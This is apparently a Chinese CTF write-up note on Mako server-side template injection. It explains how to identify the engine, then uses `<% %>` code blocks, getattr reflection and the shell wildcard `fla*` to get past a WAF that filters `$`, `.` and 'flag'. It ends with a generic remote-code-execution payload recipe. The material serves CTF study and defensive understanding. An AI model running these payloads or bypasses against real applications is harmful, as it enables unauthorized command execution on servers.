---
title: Mako 模板注入 — `<% %>` 代码块绕过 WAF
category: web
tags: [ssti, mako, getattr, waf-bypass, python]
triggers: [Mako SSTI, Mako模板引擎, <% %>, 代码块, getattr, 反射, WAF绕过, .替换为getattr, flag过滤, ${7*7}原样回显, Jython, Mako template]
created: 2026-06-07
updated: 2026-06-07
sources: [raw/LitCTF 2026 WEB方向全WP.md]
---

## Summary

Mako 模板引擎 `$` 前缀被 WAF 过滤时，用 `<% %>` 代码块替代。`.` 和 `flag` 分别用 `getattr()` 反射和通配符 `fla*` 绕过。

## Key Points

- **Mako 与 Jinja2 的区别**：Mako 用 `${expr}` 输出变量，Jinja2 用 `{{expr}}`
- `${7*7}` 原样回显 → 不是 Jinja2，试 Mako
- `$` 被 WAF 过滤 → 切换到 `<% %>` 代码块（Mako 原生语法）
- `.` 被 WAF 过滤 → `getattr(obj, 'attr')` 反射替换
- `flag` 被 WAF 过滤 → `fla*` 通配符（shell 展开）

## Step-by-Step

### 1. 识别模板引擎

```
{{7*7}}  → 原样回显（不是 Jinja2）
${7*7}   → 回显 "WAF"（是 Mako，但 $ 被拦）
```

### 2. 切换代码块语法

`<% ... %>` 是 Mako 的 Python 代码块，不依赖 `$`：

```python
<% context.write(__import__('os').popen('cat /flag').read()) %>
```
返回 "WAF" → `.` 和 `flag` 被过滤。

### 3. 绕过 `.` 用 getattr() 反射

所有 `obj.attr` 替换为 `getattr(obj, 'attr')`：

```python
<% getattr(context,'write')(getattr(getattr(__import__('os'),'popen')('cat /fla*'),'read')()) %>
```

等价于：
```python
context.write(__import__('os').popen('cat /fla*').read())
```

### 4. 绕过 `flag` 用 shell 通配符

`/fla*` 匹配 `/flag`。

## General Mako RCE Recipe

```python
# 基准 payload
<% __import__('os').popen('id').read() %>

# 全反射版（绕过 . 过滤）
<% getattr(getattr(__import__('os'),'popen')('id'),'read')() %>

# 有 context.write 的版本
<% context.write(getattr(getattr(__import__('os'),'popen')('id'),'read')()) %>
```

## Mako vs Jinja2 vs Tornado

| 模板引擎 | 标准输出 | 代码块 | 特点 |
|----------|---------|--------|------|
| Jinja2 | `{{expr}}` | `{% %}` | Flask/Django 默认 |
| Mako | `${expr}` | `<% %>` | Pyramid/Pylons |
| Tornado | `{{expr}}` | `{% %}` | Tornado 框架 |

## Connections
- Related: [[flask-ssti-session-forgery]] (Jinja2 SSTI)
- Source: [[raw/LitCTF 2026 WEB方向全WP]]
